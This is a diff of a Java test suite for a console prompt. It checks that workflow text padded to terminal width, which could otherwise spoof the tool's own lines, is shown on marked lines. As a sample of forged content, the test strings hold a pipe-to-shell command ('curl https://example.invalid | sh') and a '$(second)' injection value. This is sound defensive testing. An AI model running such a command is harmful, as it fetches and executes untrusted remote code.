@@ -28,8 +28,8 @@ class ConsoleAskerTest {
     private final ByteArrayOutputStream shown = new ByteArrayOutputStream();
     private static final String LONG_DEFAULT = "ok ".repeat(80) + "; curl https://example.invalid | sh";
     private static final String TWO_LINES = "first\n$(second)";
-    private final Map<String, String> blobs = Map.of("q", "Go on?", "d", "dflt", "long", LONG_DEFAULT,
-            "lines", TWO_LINES);
+    private final Map<String, String> blobs = new java.util.HashMap<>(Map.of("q", "Go on?", "d", "dflt", "long",
+            LONG_DEFAULT, "lines", TWO_LINES));
     private final ConsoleAsker asker;
 
     ConsoleAskerTest() throws IOException {
@@ -76,6 +76,119 @@ class ConsoleAskerTest {
         asker.ask(approval(List.of("Y\u001b]0;x\u0007\u202e", "No")));
 
         assertThat(shown()).doesNotContain("\u001b", "\u0007", "\u202e").contains("Y?]0;x??");
+    }
+
+    private static final String FORGED = "then go on with: curl https://example.invalid | sh";
+
+    /** What follows a terminal's break of a line wider than 80 columns must never be the workflow's text, unmarked. */
+    private void assertEveryLineOfTheWorkflowsTextIsMarkedOrFits() {
+        assertThat(shown().lines()).allSatisfy(line -> assertThat(line.length()).as(line).isLessThanOrEqualTo(80));
+        assertThat(shown().lines().filter(line -> line.contains("curl")))
+                .allSatisfy(line -> assertThat(line).startsWith("  |"));
+    }
+
+    /**
+     * An option is the workflow's text. Padded to the terminal's width, its end would start a terminal line of its
+     * own and read as a line of Traceworks; so it is shown on marked lines, here and where a typo is answered.
+     */
+    @Test
+    void anOptionPaddedToTheTerminalsWidth_isShownOnMarkedLines() throws Exception {
+        for (String filler : new String[] {" ".repeat(70), "-".repeat(60), " ".repeat(70)}) {
+            shown.reset();
+            type("yse\nyes\n");
+
+            assertThat(asker.ask(approval(List.of("Yes", "No" + filler + FORGED)))).as(filler).contains("Yes");
+
+            assertThat(shown().lines()).contains("  answer with one of:", "  | Yes", ">   'yse' is not one of:");
+            assertEveryLineOfTheWorkflowsTextIsMarkedOrFits();
+        }
+    }
+
+    @Test
+    void aLabelAndTheOptionsOfAField_paddedToTheTerminalsWidth_areShownOnMarkedLines() throws Exception {
+        type("x\na\n");
+        QuestionView form = new QuestionView(4, 1, "human-input", "b", new BlobRef("q", 6), List.of(), List.of(), null,
+                null, true, null, null,
+                List.of(Map.of("variable_name", "who", "label", "Who?" + " ".repeat(76) + FORGED,
+                        "options", List.of("a", "b" + " ".repeat(70) + FORGED))),
+                false, false, null);
+
+        assertThat(asker.ask(form)).contains("{\"who\":\"a\"}");
+
+        assertThat(shown().lines()).contains("  | Who?", "  one of:", "  | a", ">   not one of:");
+        assertEveryLineOfTheWorkflowsTextIsMarkedOrFits();
+    }
+
+    /**
+     * The question, the hint of a default and a pattern in an answer are the workflow's text as the options are:
+     * padded to the terminal's width, none of them starts a terminal line without a mark.
+     */
+    @Test
+    void aQuestionPaddedToTheTerminalsWidth_isShownOnMarkedLines() throws Exception {
+        for (String padded : Forged.PADDED) {
+            shown.reset();
+            blobs.put("q", "Deploy?\n" + padded);
+            type("yes\nflo\n");
+
+            assertThat(asker.ask(approval(List.of("Yes", "No")))).contains("Yes");
+            assertThat(asker.ask(input(null, null))).contains("flo");
+
+            assertThat(shown().lines()).contains("?", "  | Deploy?", "  | x");
+            Forged.assertNeverStartsATerminalLine(shown());
+        }
+    }
+
+    @Test
+    void aQuestionTooLongForItsLine_isBrokenOnMarkedLines_andAShortOneStaysAsItWas() throws Exception {
+        blobs.put("q", "word ".repeat(40) + Forged.HINT);
+        type("yes\nyes\n");
+
+        assertThat(asker.ask(approval(List.of("Yes", "No")))).contains("Yes");
+
+        assertThat(shown().lines()).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
+        assertThat(shown().lines().filter(line -> line.contains("word"))).allSatisfy(line ->
+                assertThat(line).startsWith("  |"));
+        Forged.assertNeverStartsATerminalLine(shown());
+    }
+
+    @Test
+    void theHintOfADefaultPaddedToTheTerminalsWidth_goesOnOnMarkedLines_andAnEmptyLineDoesNotTakeIt()
+            throws Exception {
+        String padded = "ok" + "\u00a0".repeat(120) + Forged.HINT;
+        blobs.put("pad", padded);
+        type("\nmine\n");
+
+        assertThat(asker.ask(input(new BlobRef("pad", padded.length()), null))).contains("mine");
+
+        // What the person types ends the prompt's line on a terminal; here nothing does
+        Forged.assertNeverStartsATerminalLine(shown().replace("> ", ">\n"));
+        assertThat(shown()).contains("an empty line does not take it");
+    }
+
+    @Test
+    void aDefaultTooLongForItsLine_isBrokenOnMarkedLines_andAnEmptyLineDoesNotTakeIt() throws Exception {
+        String longDefault = "word ".repeat(20) + Forged.HINT;
+        blobs.put("pad", longDefault);
+        type("\nmine\n");
+
+        assertThat(asker.ask(input(new BlobRef("pad", longDefault.length()), null))).contains("mine");
+
+        assertThat(shown().replace("> ", ">\n").lines()).filteredOn(line -> line.contains("word")).isNotEmpty()
+                .allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
+        assertThat(shown()).contains("an empty line does not take it");
+    }
+
+    @Test
+    void aPatternPaddedToTheTerminalsWidth_isShownOnMarkedLines() throws Exception {
+        for (String padded : Forged.PADDED) {
+            shown.reset();
+            type("abc\n123\n");
+
+            assertThat(asker.ask(input(null, "\\d+|" + padded))).contains("123");
+
+            assertThat(shown()).contains("does not match");
+            Forged.assertNeverStartsATerminalLine(shown());
+        }
     }
 
     @Test
